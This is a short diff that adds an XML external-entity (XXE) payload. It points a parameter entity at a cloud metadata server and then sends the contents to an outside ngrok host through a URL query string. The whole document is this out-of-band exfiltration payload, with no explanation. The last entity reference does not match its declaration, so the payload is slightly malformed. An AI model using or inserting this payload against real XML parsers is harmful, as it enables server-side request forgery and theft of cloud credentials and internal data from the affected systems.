@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "http://metadata_server/data/">
+<!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://dce8e57e.ngrok.io/?x=%file;'>">
+%eval;
+%exfiltrate;
